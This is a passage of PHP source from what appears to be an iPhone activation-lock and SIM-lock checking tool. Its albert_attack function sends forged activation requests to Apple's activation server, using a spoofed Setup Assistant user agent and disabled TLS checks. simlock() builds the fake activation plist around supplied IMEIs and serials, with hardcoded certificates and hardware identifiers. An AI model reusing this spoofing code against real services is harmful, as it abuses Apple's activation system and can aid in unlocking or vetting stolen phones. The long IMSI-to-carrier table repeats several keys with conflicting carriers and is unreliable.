      $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
      $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
      $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
    } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
      $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
    } else {
      $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
    }
  }


  public function checkInfo($imei)
  {
    $url = "https://m.att.com/shopmobile/wireless/byop/checkIMEI.xhr.html ";
    $post_data = "_dynSessConf=23&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.imeiNumber=$imei&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.imeiNumber=+&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.BYODSource=mobile&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.BYODSource=+&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.sucessUrl=%2Fshopmobile%2Fwireless%2Fbyop%2FcheckIMEI%2Fjcr%3Acontent%2Fmaincontent%2Fimeiinfo.ajax.getImeiValidationResponse.xhr.html&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.sucessUrl=+&%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.validateImei=&_D%3A%2Fatt%2Fecom%2Fshop%2Fview%2FValidateImeiFormHandler.validateImei=+&_DARGS=%2Fshopmobile%2Fwireless%2Fbyop%2FcheckIMEI.xhr.html";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded", "Content-Length: " . strlen($post_data)));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.127");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

    $xml_response = curl_exec($ch);
    if (curl_errno($ch)) {
      $error_message = curl_error($ch);
      $error_no = curl_errno($ch);

      //	echo "error_message: " . $error_message . "<br>";
      //	echo "error_no: " . $error_no . "<br>";
    }
    curl_close($ch);

    if (strpos($xml_response, "deviceTitle") !== false) {
      $device = json_decode($xml_response);
      $device = $device->deviceTitle;
      $device = str_replace(" - ", " ", $device);
      $device = str_replace("Apple ", "", $device);
      return $device;
    } else {
      return "Unknown";
    }
  }

  private function IMSI_ARRAY()
  {

    return array('2321069', '2321170', '0839012', '3104101', '3102605', '2040400', '2343303', '2341590', '2400700', '2400111', '2400885', '2720303', '2940102', '4402011', '2163011', '2080111', '3027204', '3114801');
  }

  public function imsiChecker($imsi)
  {
    if ($imsi == '2321069')
      return 'AUSTRIA 3 HUTCHISON';
    else if ($imsi == '2321170')
      return 'A1 MOBILKOM AUSTRIA';
    else if ($imsi == '0839012')
      return 'SPRINT USA';
    else if ($imsi == '3104101')
      return 'US AT&T Locked Activation Policy
<br>Next Tether Policy: 23<br>Country: United States';
    else if ($imsi == '3102605')
      return 'T-MOBILE USA';
    else if ($imsi == '2040400')
      return 'VERIZON USA';
    else if ($imsi == '2343303')
      return 'EE UK (TMOBILE/ORANGE)';
    else if ($imsi == '2341590')
      return 'VODAFONE UK';
    else if ($imsi == '2400700')
      return 'TELE2 SWEDEN';
    else if ($imsi == '2400111')
      return 'TELIA SWEDEN';
    else if ($imsi == '2400885')
      return 'TELENOR SWEDEN';
    else if ($imsi == '2720303')
      return 'IRELAND METEOR';
    else if ($imsi == '2940102')
      return 'T-MOBILE MACEDONIA';
    else if ($imsi == '4402011')
      return 'SOFTBANK JAPAN';
    else if ($imsi == '2163011')
      return 'T-MOBILE HUNGARY';
    else if ($imsi == '2080111')
      return 'ORANGE FRANCE';
    else if ($imsi == '3027204')
      return 'CANADA ROGERS';
    else if ($imsi == '2040400')
      return 'VERIZON/TRACFONE USA';
    else if ($imsi == '2760111')
      return 'ALBANIAN MOBILE';
    else if ($imsi == '2760311')
      return 'EAGLE MOBILE';
    else if ($imsi == '2760211')
      return 'VODAFONE';
    else if ($imsi == '2760411')
      return 'PLUS AL';
    else if ($imsi == '6030111')
      return 'ALGETEL';
    else if ($imsi == '6030311')
      return 'NEDJMA';
    else if ($imsi == '6030211')
      return 'ORASCOM';
    else if ($imsi == '2130311')
      return 'MOBILAND';
    else if ($imsi == '6310211')
      return 'UNITEL';
    else if ($imsi == '3654011')
      return 'CABL&WI';
    else if ($imsi == '3650511')
      return 'MOSSEL';
    else if ($imsi == '3651011')
      return 'WEBLINK';
    else if ($imsi == '7161003')
      return 'CLARO';
    else if ($imsi == '7161003')
      return 'COMPALA';
    else if ($imsi == '7223101')
      return 'CTI';
    else if ($imsi == '7220104')
      return 'MOVISTAR';
    else if ($imsi == '7220211')
      return 'NEXTEL';
    else if ($imsi == '7222011')
      return 'NEXTEL2';
    else if ($imsi == '7223411')
      return 'TELECOM';
    else if ($imsi == '7220711')
      return 'TELEFONI';
    else if ($imsi == '7227011')
      return 'TELFONIC';
    else if ($imsi == '2830134')
      return 'ARMENTEL';
    else if ($imsi == '2830434')
      return 'KARABAKH';
    else if ($imsi == '2831034')
      return 'ORANGE';
    else if ($imsi == '2830534')
      return 'VIVACELL';
    else if ($imsi == '5050610')
      return '3';
    else if ($imsi == '5050210')
      return 'OPTUS';
    else if ($imsi == '5050390')
      return 'VODAFONE';
    else if ($imsi == '5051570')
      return '3GIS';
    else if ($imsi == '5051470')
      return 'AAPT';
    else if ($imsi == '5052470')
      return 'ADVAN';
    else if ($imsi == '5058870')
      return 'LOCALSTAR';
    else if ($imsi == '5050870')
      return 'ONE';
    else if ($imsi == '5050534')
      return 'OZITEL';
    else if ($imsi == '5057170')
      return 'TELSTRA71';
    else if ($imsi == '5057270')
      return 'TELSTRA72';
    else if ($imsi == '5051170')
      return 'TELSTRA11';
    else if ($imsi == '5050134')
      return 'TELSTRA';
    else if ($imsi == '2321070')
      return '3HUTCH';
    else if ($imsi == '2320170')
      return 'A1 TELEKOM';
    else if ($imsi == '2321570')
      return 'BARABL';
    else if ($imsi == '2321170')
      return 'BOBA1';
    else if ($imsi == '2320570')
      return 'ONEORA';
    else if ($imsi == '2320770')
      return 'TELERI';
    else if ($imsi == '2320370')
      return 'T-MOBI LE';
    else if ($imsi == '2321270')
      return 'YESORA';
    else if ($imsi == '2320588')
      return 'ORANGE';
    else if ($imsi == '2321069')
      return 'THREE';
    else if ($imsi == '5050970')
      return 'AIRNET';
    else if ($imsi == '5050434')
      return 'DEPART';
    else if ($imsi == '2570434')
      return 'BEST';
    else if ($imsi == '2570134')
      return 'MDC';
    else if ($imsi == '2270234')
      return 'MTS';
    else if ($imsi == '2061034')
      return 'BASE';
    else if ($imsi == '2060534')
      return 'GLOBUL';
    else if ($imsi == '2061034')
      return 'MOBISTAR';
    else if ($imsi == '2060134')
      return 'PROXIMUS';
    else if ($imsi == '2062050')
      return 'ORTEL';
    else if ($imsi == '2840179')
      return 'MTEL';
    else if ($imsi == '2840310')
      return 'VIVACOM';
    else if ($imsi == '2840510')
      return 'GLOBUL';
    else if ($imsi == '3026104')
      return 'BELL610';
    else if ($imsi == '3101703')
      return 'BELLPACIFIC';
    else if ($imsi == '3023704')
      return 'FIDO';
    else if ($imsi == '3027204')
      return 'ROGERS';
    else if ($imsi == '3022204')
      return 'TELUS220';
    else if ($imsi == '3026600')
      return 'MTS';
    else if ($imsi == '3026102')
      return 'VIRGIN';
    else if ($imsi == '3113700')
      return 'USA';
    else if ($imsi == '7300304')
      return 'CLARO';
    else if ($imsi == '7300104')
      return 'ENTEL';
    else if ($imsi == '7301004')
      return 'ENTEL10';
    else if ($imsi == '7300204')
      return 'MOVISTAR';
    else if ($imsi == '4600202')
      return 'MOBILE';
    else if ($imsi == '4600158')
      return 'UNICOM';
    else if ($imsi == '2040438')
      return 'TELECOM CHINA';
    else if ($imsi == '7320014')
      return 'COLOMTEL';
    else if ($imsi == '7321014')
      return 'COMCEL';
    else if ($imsi == '7320024')
      return 'EDATEL';
    else if ($imsi == '7321234')
      return 'MOVISTA3';
    else if ($imsi == '7321024')
      return 'MOVISTAR';
    else if ($imsi == '7321114')
      return 'TIGO1';
    else if ($imsi == '7321034')
      return 'TIGO3';
    else if ($imsi == '2190199')
      return 'T-MOBILE';
    else if ($imsi == '2191065')
      return 'VIP';
    else if ($imsi == '2300434')
      return 'MOBIKOM';
    else if ($imsi == '2300234')
      return 'O2TELEFH';
    else if ($imsi == '2309834')
      return 'SPRAVA';
    else if ($imsi == '2300134')
      return 'TMOBI';
    else if ($imsi == '2300334')
      return 'VODAFONE';
    else if ($imsi == '2309934')
      return 'VODAF2';
    else if ($imsi == '2620125')
      return 'TM';
    else if ($imsi == '2382010')
      return 'DEMARK';
    else if ($imsi == '2380534')
      return 'APS';
    else if ($imsi == '2380734')
      return 'BARABLU';
    else if ($imsi == '2380634')
      return 'H3G';
    else if ($imsi == '2380632')
      return '3';
    else if ($imsi == '2380241')
      return 'TELEN';
    else if ($imsi == '2380334')
      return 'MIGWAY';
    else if ($imsi == '2380134')
      return 'TDC';
    else if ($imsi == '2381034')
      return 'TDC2';
    else if ($imsi == '2387734')
      return 'TELENOR';
    else if ($imsi == '2382034')
      return 'TELIA';
    else if ($imsi == '2383034')
      return 'TELIA30';
    else if ($imsi == '7321234')
      return 'MOVIL';
    else if ($imsi == '7400234')
      return 'ALEGRO';
    else if ($imsi == '7400034')
      return 'MOVISTA';
    else if ($imsi == '7400134')
      return 'PORTA';
    else if ($imsi == '6020111')
      return 'MOBINIL';
    else if ($imsi == '6020211')
      return 'VODAFONE';
    else if ($imsi == '6020311')
      return 'ETISALAT';
    else if ($imsi == '7061034')
      return 'CLARO/CTE';
    else if ($imsi == '7060134')
      return 'CTE/CLARO';
    else if ($imsi == '7060234')
      return 'DIGICE';
    else if ($imsi == '7060434')
      return 'MOVITA';
    else if ($imsi == '7060334')
      return 'TELEMO';
    else if ($imsi == '2480134')
      return 'EMT';
    else if ($imsi == '2440311')
      return 'NDA';
    else if ($imsi == '2449111')
      return 'SONERA';
    else if ($imsi == '2082136')
      return 'BOUYGUES';
    else if ($imsi == '2082031')
      return 'BT';
    else if ($imsi == '2080189')
      return 'ORANGE';
    else if ($imsi == '2082011')
      return 'BOUYGUES20';
    else if ($imsi == '2082111')
      return 'BOUYGUES21';
    else if ($imsi == '2088811')
      return 'BOUYGUES88';
    else if ($imsi == '2080111')
      return 'ORANGE01';
    else if ($imsi == '2080211')
      return 'ORANGE02';
    else if ($imsi == '2081011')
      return 'SFR10';
    else if ($imsi == '2081111')
      return 'SFR11';
    else if ($imsi == '2081031')
      return 'SFR';
    else if ($imsi == '2081003')
      return 'SFR';
    else if ($imsi == '2080191')
      return 'VIRGIN';
    else if ($imsi == '2620111')
      return 'T-MOBILE';
    else if ($imsi == '2620208')
      return 'VODAFONE';
    else if ($imsi == '2020134')
      return 'COSMOTE';
    else if ($imsi == '2020934')
      return 'QTELECOM';
    else if ($imsi == '2020534')
      return 'VODAFONE';
    else if ($imsi == '2021034')
      return 'WIND';
    else if ($imsi == '7080111')
      return 'CLARO';
    else if ($imsi == '2163011')
      return 'T-MOBILE';
    else if ($imsi == '2167000')
      return 'VODAFONE';
    else if ($imsi == '4040211')
      return 'AIRTEL02';
    else if ($imsi == '4040111')
      return 'VODAF01';
    else if ($imsi == '4040511')
      return 'VODAF05';
    else if ($imsi == '4044611')
      return 'VODAF46';
    else if ($imsi == '2720110')
      return 'VODAFONE';
    else if ($imsi == '2720211')
      return 'O2';
    else if ($imsi == '2720320')
      return 'E-MOBILE';
    else if ($imsi == '2720303')
      return 'METEOR';
    else if ($imsi == '2720500')
      return '3';
    else if ($imsi == '2229834')
      return 'BLU';
    else if ($imsi == '2220234')
      return 'ELSACOM';
    else if ($imsi == '2229934')
      return 'H3G';
    else if ($imsi == '2227734')
      return 'IPSE';
    else if ($imsi == '2220134')
      return 'TELECOM';
    else if ($imsi == '2220134')
      return 'TIM';
    else if ($imsi == '2221034')
      return 'VODAFONE';
    else if ($imsi == '2228834')
      return 'WIND';
    else if ($imsi == '4540492')
      return 'AU KIDDI 4S';
    else if ($imsi == '4405000')
      return 'AU KIDDI 5G';
    else if ($imsi == '4402081')
      return 'SOFTBANK 4S/5G';
    else if ($imsi == '4405014')
      return 'AU KDDI IPHONE5';
    else if ($imsi == '4167711')
      return 'ORANGE';
    else if ($imsi == '4500826')
      return 'TELECOME';
    else if ($imsi == '2950211')
      return 'ORANGE';
    else if ($imsi == '2950111')
      return 'SWISCO';
    else if ($imsi == '2460165')
      return 'OMNITEL';
    else if ($imsi == '2460165')
      return 'OMNITEL';
    else if ($imsi == '2700101')
      return 'LUXGSM';
    else if ($imsi == '2707701')
      return 'TANGO';
    else if ($imsi == '2709901')
      return 'VOXMOBI';
    else if ($imsi == '4550234')
      return 'CHINA';
    else if ($imsi == '4550134')
      return 'CMT';
    else if ($imsi == '4550534')
      return 'HUTCHIS';
    else if ($imsi == '4550034')
      return 'SMARTT';
    else if ($imsi == '2940387')
      return 'VIP';
    else if ($imsi == '2940200')
      return 'ONE(EX-COSMOFON)';
    else if ($imsi == '2940102')
      return 'T-MOBILE';
    else if ($imsi == '3340202')
      return 'TELCEL';
    else if ($imsi == '3340100')
      return 'NEXTEL';
    else if ($imsi == '3340500')
      return 'LUSACELL';
    else if ($imsi == '3340300')
      return 'MOVISTAR';
    else if ($imsi == '3340202')
      return 'AMERICA MOVIL';
    else if ($imsi == '2590101')
      return 'ORANGE';
    else if ($imsi == '2970200')
      return 'T-MOBILE';
    else if ($imsi == '2041611')
      return 'T-MOBILE';
    else if ($imsi == '5300134')
      return 'RESERVE';
    else if ($imsi == '2040438')
      return 'VODAFONE';
    else if ($imsi == '5302834')
      return 'ECONET';
    else if ($imsi == '5302434')
      return 'NZCOMUNIC';
    else if ($imsi == '5300534')
      return 'TELECOM';
    else if ($imsi == '5300434')
      return 'TELTRACLE';
    else if ($imsi == '5300134')
      return 'VODAFONE';
    else if ($imsi == '5300334')
      return 'WOOSH';
    else if ($imsi == '2420211')
      return 'NETCOM';
    else if ($imsi == '2420111')
      return 'TELENOR';
    else if ($imsi == '2400768')
      return 'TELE2';
    else if ($imsi == '7161011')
      return 'CLARO';
    else if ($imsi == '7161011')
      return 'TIM';
    else if ($imsi == '5150220')
      return 'GB';
    else if ($imsi == '5150303')
      return 'SM';
    else if ($imsi == '5150509')
      return 'SUN';
    else if ($imsi == '5150211')
      return 'GLOBE';
    else if ($imsi == '2600211')
      return 'ERA';
    else if ($imsi == '2600311')
      return 'ORANGE';
    else if ($imsi == '2600200')
      return 'T-MOBILE';
    else if ($imsi == '2680311')
      return 'OPTIMUS';
    else if ($imsi == '2680111')
      return 'VODAFONE';
    else if ($imsi == '2680611')
      return 'TMN';
    else if ($imsi == '2260107')
      return 'VODAFONE';
    else if ($imsi == '2261007')
      return 'ORANGE';
    else if ($imsi == '2260307')
      return 'COSMOTE';
    else if ($imsi == '2260407')
      return 'ZAPP';
    else if ($imsi == '2502834')
      return 'BEELINE28';
    else if ($imsi == '2509934')
      return 'BEELINE99';
    else if ($imsi == '2500234')
      return 'MEGAFON';
    else if ($imsi == '2501034')
      return 'MTS10';
    else if ($imsi == '2509334')
      return 'TELECOM';
    else if ($imsi == '4200734')
      return 'EAE';
    else if ($imsi == '4200334')
      return 'MOBILY';
    else if ($imsi == '4200134')
      return 'STC';
    else if ($imsi == '4200434')
      return 'ZAINSA';
    else if ($imsi == '2310411')
      return 'T-MOBILE 2';
    else if ($imsi == '2310234')
      return 'EUROTEL 2';
    else if ($imsi == '2310134')
      return 'ORANGE';
    else if ($imsi == '2310534')
      return 'ORANGE UMT';
    else if ($imsi == '2311534')
      return 'ORANGE UMT2';
    else if ($imsi == '2310634')
      return 'TELEFICO2';
    else if ($imsi == '6550134')
      return 'VODACOM';
    else if ($imsi == '2934001')
      return 'SI-MOBILE';
    else if ($imsi == '2140711')
      return 'MOVISTAR';
    else if ($imsi == '2140333')
      return 'ORANGE';
    else if ($imsi == '2140198')
      return 'VODAFONE';
    else if ($imsi == '2140401')
      return 'YOIGO';
    else if ($imsi == '2400200')
      return '3';
    else if ($imsi == '2400111')
      return 'TELIA';
    else if ($imsi == '2400700')
      return 'TELE2';
    else if ($imsi == '2400100')
      return 'TELIA';
    else if ($imsi == '2400885')
      return 'TELENOR';
    else if ($imsi == '2280167')
      return 'SWISSCOM';
    else if ($imsi == '2280311')
      return 'ORANGE';
    else if ($imsi == '2280200')
      return 'SUNRISE';
    else if ($imsi == '2280111')
      return 'SWISCOM';
    else if ($imsi == '2280211')
      return 'SUNRISE';
    else if ($imsi == '2280121')
      return 'SWISCOM (UNOFFICAL)';
    else if ($imsi == '4669234')
      return 'CHUNGWA';
    else if ($imsi == '2860134')
      return 'TURCELL';
    else if ($imsi == '2860211')
      return 'VODAFONE';
    else if ($imsi == '2862034')
      return 'VODAFONE';
    else if ($imsi == '4240334')
      return 'DU';
    else if ($imsi == '4240234')
      return 'ETISAL';
    else if ($imsi == '2342091')
      return '3';
    else if ($imsi == '2341091')
      return 'O2';
    else if ($imsi == '2343320')
      return 'ORANGE/T-MOBILE';
    else if ($imsi == '2341590')
      return 'VODAFONE 2';
    else if ($imsi == '2340211')
      return 'O2 – 2';
    else if ($imsi == '2343334')
      return 'ORANGE33';
    else if ($imsi == '2343091')
      return 'T-MOBILE';
    else if ($imsi == '2343091')
      return 'ORANGE';
    else if ($imsi == '2343091')
      return 'EE';
    else if ($imsi == '2340100')
      return 'VECTONE';
    else if ($imsi == '7481011')
      return 'CTIMOV';
    else if ($imsi == '7480711')
      return 'MOVISTAR';
    else if ($imsi == '7480111')
      return 'ANTEL';
    else if ($imsi == '3104101')
      return 'ATT';
    else if ($imsi == '2040400')
      return 'VERIZON';
    else if ($imsi == '3160101')
      return 'SPRINT(CDMA)';
    else if ($imsi == '3461401')
      return 'CABLE&WIRELESS LIME';
    else if ($imsi == '3101200')
      return 'SPRINT IPHONE5';
    else if ($imsi == '2040400')
      return 'CRICKET';
    else if ($imsi == '3101200')
      return 'VIRGIN IPHONE5';
    else if ($imsi == '2040400')
      return 'STRAIGHT TALK';
    else if ($imsi == '3102605')
      return 'T-MOBILE IPHONE5';
    else if ($imsi == '3113700')
      return 'WIRELESS ALASKA';
    else if ($imsi == '3102620')
      return 'T-MOBILE';
    else if ($imsi == '3114801')
      return 'TRACFONE';
    else if ($imsi == '3102600')
      return 'METROPCS';
    else if ($imsi == '3114801')
      return 'TOTAL WIRELESS';
    else if ($imsi == '3104101')
      return 'CONSUMER CELULLAR';
    else if ($imsi == '3114801')
      return 'STRAIGHT TALK';
    else if ($imsi == '3160101')
      return 'BOOST MOBILE';
    else if ($imsi == '2040400')
      return 'XFINITY';
    else if ($imsi == '7340486')
      return 'MOVISTAR';
    else if ($imsi == '7340200')
      return 'DIGITEL';
    else if ($imsi == '7340600')
      return 'MOVILNET';
    else if ($imsi == '7340400')
      return 'TELEFONICA';
    else
      return 'OTHER';
  }

  public function validate_imei($imei)
  {
    if (!preg_match('/^[0-9]{15}$/', $imei)) return false;
    $sum = 0;
    for ($i = 0; $i < 14; $i++) {
      $num = $imei[$i];
      if (($i % 2) != 0) {
        $num = $imei[$i] * 2;
        if ($num > 9) {
          $num = (string) $num;
          $num = $num[0] + $num[1];
        }
      }
      $sum += $num;
    }
    if ((($sum + $imei[14]) % 10) != 0) return false;
    return true;
  }

  public function match_all($needles, $haystack)
  {
    if (empty($needles)) {
      return false;
    }

    foreach ($needles as $needle) {
      if (strpos($haystack, $needle) == false) {
        return false;
      }
    }
    return true;
  }

  public function albert_attack($query)
  {
    $url = "https://albert.apple.com/deviceservices/deviceActivation";

    $test = urlencode(base64_encode($query));
    $post_data = "passcode=gfdgf&activation-info-base64=$test";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/x-www-form-urlencoded", "Content-Length: " . strlen($post_data)));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, "iOS 11.1.1 15B150 iPhone Setup Assistant iOS Device Activator (MobileActivation-286.20.3 built on Sep 29 2017 at 18:51:08)");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

    $xml_response = curl_exec($ch);
    if (curl_errno($ch)) {
      $error_message = curl_error($ch);
      $error_no = curl_errno($ch);

      //	echo "error_message: " . $error_message . "<br>";
      //	echo "error_no: " . $error_no . "<br>";
    }
    curl_close($ch);

    //if(DEBUG){ print_r($xml_response)."</br>"; die(); }

    $aclock = array('SIM', 'Not', 'Supported');
    $problemiphone = array('Please', 'restore', 'the', 'phone', 'and', 'install', 'the', 'latest', 'version', 'of', 'iOS');
    $problemiphone1 = array('Device', 'Unknown');
    $problemiphone2 = array('There', 'is', 'a', 'problem', 'with', 'your', 'iPhone.');
    $problemiphone3 = array('There', 'is', 'a', 'problem', 'with', 'this', 'iPhone.');
    $activationerror = array('This', 'iPhone', 'is', 'not', 'able', 'to', 'complete', 'the', 'activation', 'process');
    $unsupportedsim =  array('Unsupported', 'SIM');
    $icloudLocked =  array('This', 'iPhone', 'is', 'linked');
    $errorUnlocked = array('Activation', 'could');
    //Activation could not be completed
    if ($this->match_all($aclock, $xml_response)) {
      return "Locked";
    } else if ($this->match_all($problemiphone, $xml_response)) {
      return "Unlocked";
    } else if ($this->match_all($problemiphone2, $xml_response)) {
      return "chimaera";
    } else if ($this->match_all($problemiphone3, $xml_response)) {
      return "chimaera";
    } else if ($this->match_all($icloudLocked, $xml_response)) {
      return "Unlocked";
    } else if ($this->match_all($errorUnlocked, $xml_response)) {
      return "Unlocked";
    } else if (strpos($xml_response, "AccountToken") !== false) {
      return "Unlocked";
    } else if ($this->match_all($activationerror, $xml_response)) {
      return "TryMeid";
    } else {
      print_r($xml_response);
      //return "IDK BRO";
    }
  }

  public function simlock($imei, $sn, $meid, $imei2, $imsi = '6030326')
  {
    if (isset($meid)) {
      $meid = '<key>MobileEquipmentIdentifier</key>
			<string>' . $meid . '</string>';
    }

    if (empty($imei2) == false) {
      $imei2 = '<key>InternationalMobileEquipmentIdentity2</key>
			<string>' . $imei2 . '</string>';
    }

    $ActivationInfoXML =
      '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>ActivationRequestInfo</key>
        <dict>
            <key>ActivationRandomness</key>
            <string>24535014-9805-49AA-AC5C-2DD8EB69B12A</string>
            <key>ActivationState</key>
            <string>Unactivated</string>
            <key>FMiPAccountExists</key>
            <true />
        </dict>
        <key>BasebandRequestInfo</key>
        <dict>
            <key>ActivationRequiresActivationTicket</key>
            <true />
            <key>BasebandActivationTicketVersion</key>
            <string>V2</string>
            <key>BasebandChipID</key>
            <integer>7282913</integer>
            <key>BasebandMasterKeyHash</key>
            <string>AEA5CCE143668D0EFB4CE1F2C94C966A6496C6AA</string>
            <key>BasebandSerialNumber</key>
            <data>
                NE5Ksw==
            </data>
            <key>GID1</key>
            <string>90ffffff</string>
            <key>GID2</key>
            <string>ffffffff</string>
            <key>IntegratedCircuitCardIdentity</key>
            <string>8938641090306391573</string>
            <key>InternationalMobileEquipmentIdentity</key>
            <string>' . $imei . '</string>
            ' . $imei2 . '
            <key>InternationalMobileSubscriberIdentity</key>
            <string>' . $imsi . '73956326</string>
            ' . $meid . '
            <key>PhoneNumber</key>
            <string></string>
            <key>SIMStatus</key>
            <string>kCTSIMSupportSIMStatusReady</string>
            <key>SupportsPostponement</key>
            <true />
            <key>kCTPostponementInfoPRIVersion</key>
            <string>0.1.144</string>
            <key>kCTPostponementInfoPRLName</key>
            <integer>0</integer>
            <key>kCTPostponementInfoServiceProvisioningState</key>
            <true />
        </dict>
        <key>DeviceCertRequest</key>
        <data>
            LS0tLS1CRUdJTiBDRVJUSUZJQ0FURSBSRVFVRVNULS0tLS0KTUlJQnhEQ0NBUzBDQVFB
            d2dZTXhMVEFyQmdOVkJBTVRKRGN3TURGQk1UWTBMVGxHUkRBdE5EaEJNUzFCTVRFeg0K
            TFRjNVJUaEdNVFF5UXprelFURUxNQWtHQTFVRUJoTUNWVk14Q3pBSkJnTlZCQWdUQWtO
            Qk1SSXdFQVlEVlFRSA0KRXdsRGRYQmxjblJwYm04eEV6QVJCZ05WQkFvVENrRndjR3hs
            SUVsdVl5NHhEekFOQmdOVkJBc1RCbWxRYUc5dQ0KWlRDQm56QU5CZ2txaGtpRzl3MEJB
            UUVGQUFPQmpRQXdnWWtDZ1lFQTdNV1I0T3VJUG81NEowczhmMkQ4bnRtYw0KYWVkOGNu
            NENCM2p2bzZjY2hQQTJSSGV4TDVxVU5YblZNZzhHUmVLN1RCSmZFcDBYaVpmMlR5TTRT
            QXFjL2VLUg0KbEIzdFFUdGJhYjQ4UkxDenljUWlHelhoZXk0R0w0ckoxQTV3ditXUUYw
            YmtVcDhzUUk4b3VoMnFKU3ZiaWp6Rg0KOTE4d2d1aWZsZUJZcGRaMjBEMENBd0VBQWFB
            QU1BMEdDU3FHU0liM0RRRUJCUVVBQTRHQkFOVFRhVkZHMnZJag0KZ0J5Zkp6d1U4ZStD
            MXBqYzNKMWJvL1FjeXU2SDZ2aDBYZHNPMk9qOFBiUWRBY09teUJyTG50QTVhT2ZsY1pp
            Qw0KMmJQSjhiNFBmVVRVWkJxQVdCS0JodFF6QjVVWDRuZDhsTTVKeDc3c0VwVC9uTjdQ
            NDhZQmgyWlJqaDg4SmQrcg0KdDFwWnZ3VWxWYTZwRVJ2N2RWTDZNM3pGRmNwQVBhejcK
            LS0tLS1FTkQgQ0VSVElGSUNBVEUgUkVRVUVTVC0tLS0t
        </data>
        <key>DeviceID</key>
        <dict>
            <key>SerialNumber</key>
            <string>' . $sn . '</string>
            <key>UniqueDeviceID</key>
            <string>cbed4ff1e95edba585a94f4e8d333379f282df9e</string>
        </dict>
        <key>DeviceInfo</key>
        <dict>
            <key>BuildVersion</key>
            <string>15A372</string>
            <key>DeviceClass</key>
            <string>iPhone</string>
            <key>DeviceVariant</key>
            <string>A</string>
            <key>ModelNumber</key>
            <string>MKQM2</string>
            <key>OSType</key>
            <string>iPhone OS</string>
            <key>ProductType</key>
            <string>iPhone8,1</string>
            <key>ProductVersion</key>
            <string>11.0</string>
            <key>RegionCode</key>
            <string>ZD</string>
            <key>RegionInfo</key>
            <string>ZD/A</string>
            <key>RegulatoryModelNumber</key>
            <string>A1784</string>
            <key>UniqueChipID</key>
            <integer>2859022370934054</integer>
        </dict>
        <key>RegulatoryImages</key>
        <dict>
            <key>DeviceVariant</key>
            <string>A</string>
        </dict>
        <key>UIKCertification</key>
        <dict>
            <key>BluetoothAddress</key>
            <string>bc:4c:c4:14:58:ac</string>
            <key>BoardId</key>
            <integer>14</integer>
            <key>ChipID</key>
            <integer>35152</integer>
            <key>EthernetMacAddress</key>
            <string>bc:4c:c4:14:58:ad</string>
            <key>UIKCertification</key>
            <data>
                MIICxjCCAm0CAQEwADCB2QIBATAKBggqhkjOPQQDAgNHADBEAiBOmykQ378M
                lvcKVkyjlHoYwKN8/WK/lHGv2zscJxnE+AIgN9zrZRpE0K7RZuZtruXkgFxV
                iM4SXByiyOPFmBdcy+MwWzAVBgcqhkjOPQIBoAoGCCqGSM49AwEHA0IABFNT
                gwNJnJnk05h2j2K9p75U96PvOBiti2J0nQNXeKWGKizCqergjKtHZqAtVBsX
                mdd3311pxQ75CsX3EUaznAagCgQIYWNzc0gAAACiFgQUfYSpUwwmRfMbGkRA
                Ps1aKCLT0dwwgcICAQEwCgYIKoZIzj0EAwIDSAAwRQIhAPDzRlZqRnm9wRmT
                1oIy5sh/AbDHSQVmitgH9NoCpoctAiB9+1hOM8Zeb1htQV8s81Xg0aou/86P
                PveOu9TIzYQNnDBbMBUGByqGSM49AgGgCgYIKoZIzj0DAQcDQgAESTAiT/2L
                1L1+0JBiUSGPumizG+wQp12JUM0T80UqWbvEE9ljAk676/zhKQBjl38/Sn06
